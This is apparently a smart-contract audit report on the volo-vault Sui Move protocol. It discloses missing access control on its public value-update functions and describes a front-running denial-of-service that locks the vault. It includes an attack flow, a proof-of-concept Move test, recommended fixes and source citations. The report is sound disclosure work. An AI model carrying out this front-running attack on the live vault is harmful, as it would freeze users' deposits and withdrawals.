# Audit Report

## Title
Missing Access Control in Adaptor Value Update Functions Allows Permanent Vault DoS

## Summary
All adaptor value update functions are declared as `public fun` without operator capability requirements, allowing any external account to call them during vault operations. When an attacker front-runs the operator's value update transactions, the `finish_update_asset_value` function attempts to add duplicate keys to the `asset_types_updated` table using `Table::add()`, which aborts on duplicate keys. This permanently locks the vault in `VAULT_DURING_OPERATION_STATUS` with no admin recovery mechanism, blocking all user deposits and withdrawals.

## Finding Description

The vulnerability stems from a complete lack of access control on all adaptor value update functions. All adaptor modules declare their update functions as `public fun`:

- `update_navi_position_value` [1](#0-0) 
- `update_cetus_position_value` [2](#0-1) 
- `update_suilend_position_value` [3](#0-2) 
- `update_momentum_position_value` [4](#0-3) 
- `update_receipt_value` [5](#0-4) 
- `update_free_principal_value` [6](#0-5) 
- `update_coin_type_asset_value` [7](#0-6) 

Since Vault is a shared object [8](#0-7)  and OracleConfig is also shared [9](#0-8) , these functions can be called by any external account via Programmable Transaction Blocks.

All these functions call `finish_update_asset_value` [10](#0-9) , which during vault operations attempts to add the asset type to the `asset_types_updated` table without checking for duplicates [11](#0-10) . The Sui Move `Table::add()` function aborts if the key already exists.

The only validation in `finish_update_asset_value` is `assert_enabled()` [12](#0-11) , which only checks that status is not `VAULT_DISABLED_STATUS` [13](#0-12) , allowing operations during `VAULT_DURING_OPERATION_STATUS`.

**Attack Flow:**

1. Operator calls `start_op_with_bag`, which borrows assets and records them in `asset_types_borrowed` [14](#0-13) , and sets vault status to `VAULT_DURING_OPERATION_STATUS` [15](#0-14) 

2. Operator calls `end_op_with_bag`, which enables value updates [16](#0-15) 

3. **Attack Window Opens:** Attacker monitors `OperationStarted` events and front-runs the operator's value update PTB by calling public adaptor update functions, causing `asset_types_updated.add()` to execute first

4. Operator's legitimate update calls abort at `Table::add()` due to duplicate keys in the conditional block [17](#0-16) 

5. Vault becomes stuck: Cannot complete operation because `check_op_value_update_record` requires all borrowed assets to be marked as updated [18](#0-17) , but operator cannot re-update due to duplicate key aborts

6. No recovery mechanism: Admin's `set_enabled` function explicitly prevents status changes when vault is during operation [19](#0-18) 

## Impact Explanation

**Critical Denial of Service:**
- Vault becomes permanently stuck in `VAULT_DURING_OPERATION_STATUS`
- All user deposits abort due to `assert_normal()` requirement [20](#0-19) 
- All user withdrawals abort due to `assert_normal()` requirement [21](#0-20) 
- No new operations can start due to `assert_normal()` in `pre_vault_check` [22](#0-21) 
- Requires protocol upgrade or contract redeployment to recover

**Value Manipulation Risk:**
- Attacker can update asset values with arbitrary oracle parameters, potentially using stale prices or wrong pool references
- Validation in `check_op_value_update_record` only verifies assets are marked updated, not value correctness [23](#0-22) 
- This could manipulate `total_usd_value` calculations used in loss tolerance enforcement

**Affected Parties:** All vault users lose access to deposits and withdrawals; entire protocol operations halted.

## Likelihood Explanation

**High Probability:**
- **Reachability:** Functions are `public fun` callable via PTB with shared objects
- **Attack Complexity:** Low - attacker monitors `OperationStarted` events emitted by `start_op_with_bag` [24](#0-23)  to identify borrowed assets, then front-runs with higher gas
- **Prerequisites:** Only requires vault to be in active operation (occurs regularly for yield optimization)
- **Attack Cost:** Minimal (only transaction gas fees)
- **No Authentication:** No operator capability or access control checks in adaptor update functions
- **Attack Window:** Several blocks between `end_op_with_bag` and operator's value update transactions

The attack is economically rational: minimal cost to cause complete protocol DoS affecting potentially millions in TVL.

## Recommendation

Add operator capability requirements to all adaptor value update functions. Modify the function signatures to require `OperatorCap` and validate it:

```move
public fun update_navi_position_value<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    vault::assert_operator_not_freezed(operation, cap);
    // ... rest of function
}
```

Apply this pattern to all adaptor update functions:
- `update_cetus_position_value`
- `update_suilend_position_value`
- `update_momentum_position_value`
- `update_receipt_value`
- `update_free_principal_value`
- `update_coin_type_asset_value`

Alternatively, add a duplicate-check in `finish_update_asset_value` before calling `Table::add()`:

```move
if (!self.op_value_update_record.asset_types_updated.contains(asset_type)) {
    self.op_value_update_record.asset_types_updated.add(asset_type, true);
}
```

However, the first solution (adding access control) is preferred as it prevents unauthorized value updates entirely.

## Proof of Concept

```move
#[test]
fun test_dos_via_frontrun_value_update() {
    let mut scenario = test_scenario::begin(ADMIN);
    
    // Setup vault, oracle, operator
    setup_vault_and_oracle(&mut scenario);
    let operator_cap = create_operator_cap(&mut scenario);
    
    // Operator starts operation
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<SUI>>();
        let operation = scenario.take_shared<Operation>();
        let clock = scenario.take_shared<Clock>();
        
        let (assets_bag, tx_bag, tx_check_bag, principal, coins) = 
            vault.start_op_with_bag<SUI, USDC, suilend::main_market>(
                &operation,
                &operator_cap,
                &clock,
                vector[0], // borrow navi asset
                vector[type_name::get<NaviAccountCap>()],
                0, 0,
                scenario.ctx()
            );
        
        // Operator calls end_op_with_bag (enables value updates)
        vault.end_op_with_bag(&operation, &operator_cap, assets_bag, tx_bag, principal, coins);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        test_scenario::return_shared(clock);
    };
    
    // ATTACKER front-runs operator's value update
    scenario.next_tx(ATTACKER);
    {
        let mut vault = scenario.take_shared<Vault<SUI>>();
        let config = scenario.take_shared<OracleConfig>();
        let clock = scenario.take_shared<Clock>();
        let mut storage = scenario.take_shared<Storage>(); // Navi storage
        
        // Attacker calls public update function - NO ACCESS CONTROL
        navi_adaptor::update_navi_position_value(
            &mut vault,
            &config,
            &clock,
            string::utf8(b"navi_0"),
            &mut storage
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(storage);
    };
    
    // Operator tries to update - ABORTS with duplicate key error
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<SUI>>();
        let config = scenario.take_shared<OracleConfig>();
        let clock = scenario.take_shared<Clock>();
        let mut storage = scenario.take_shared<Storage>();
        
        // This will ABORT because asset already in asset_types_updated table
        navi_adaptor::update_navi_position_value(
            &mut vault,
            &config,
            &clock,
            string::utf8(b"navi_0"),
            &mut storage
        ); // ABORTS HERE
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(storage);
    };
    
    scenario.end();
}
```

The test demonstrates that after the attacker front-runs the value update, the operator's legitimate update call aborts, leaving the vault permanently stuck in `VAULT_DURING_OPERATION_STATUS`.

### Citations

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-13)
```text
public fun update_navi_position_value<PrincipalCoinType>(
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L28-28)
```text
    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L19-19)
```text
public fun update_cetus_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/suilend_adaptor.move (L23-23)
```text
public fun update_suilend_position_value<PrincipalCoinType, ObligationType>(
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-21)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/receipt_adaptor.move (L16-16)
```text
public fun update_receipt_value<PrincipalCoinType, PrincipalCoinTypeB>(
```

**File:** volo-vault/sources/volo_vault.move (L456-456)
```text
    transfer::share_object(vault);
```

**File:** volo-vault/sources/volo_vault.move (L523-523)
```text
    assert!(self.status() != VAULT_DURING_OPERATION_STATUS, ERR_VAULT_DURING_OPERATION);
```

**File:** volo-vault/sources/volo_vault.move (L581-581)
```text
        self.op_value_update_record.asset_types_borrowed.push_back(principal_asset_type);
```

**File:** volo-vault/sources/volo_vault.move (L645-646)
```text
public(package) fun assert_enabled<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() != VAULT_DISABLED_STATUS, ERR_VAULT_NOT_ENABLED);
```

**File:** volo-vault/sources/volo_vault.move (L716-716)
```text
    self.assert_normal();
```

**File:** volo-vault/sources/volo_vault.move (L905-905)
```text
    self.assert_normal();
```

**File:** volo-vault/sources/volo_vault.move (L1101-1101)
```text
public fun update_free_principal_value<PrincipalCoinType>(
```

**File:** volo-vault/sources/volo_vault.move (L1130-1130)
```text
public fun update_coin_type_asset_value<PrincipalCoinType, CoinType>(
```

**File:** volo-vault/sources/volo_vault.move (L1181-1181)
```text
    self.assert_enabled();
```

**File:** volo-vault/sources/volo_vault.move (L1189-1195)
```text
    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };
```

**File:** volo-vault/sources/volo_vault.move (L1206-1219)
```text
public(package) fun check_op_value_update_record<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
) {
    self.check_version();
    self.assert_enabled();
    assert!(self.op_value_update_record.value_update_enabled, ERR_OP_VALUE_UPDATE_NOT_ENABLED);

    let record = &self.op_value_update_record;

    record.asset_types_borrowed.do_ref!(|asset_type| {
        assert!(record.asset_types_updated.contains(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
        assert!(*record.asset_types_updated.borrow(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
    });
}
```

**File:** volo-vault/sources/oracle.move (L93-93)
```text
    transfer::share_object(config);
```

**File:** volo-vault/sources/operation.move (L73-73)
```text
    vault.assert_normal();
```

**File:** volo-vault/sources/operation.move (L74-74)
```text
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
```

**File:** volo-vault/sources/operation.move (L195-204)
```text
    emit(OperationStarted {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount,
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount,
        total_usd_value,
    });
```

**File:** volo-vault/sources/operation.move (L294-294)
```text
    vault.enable_op_value_update();
```
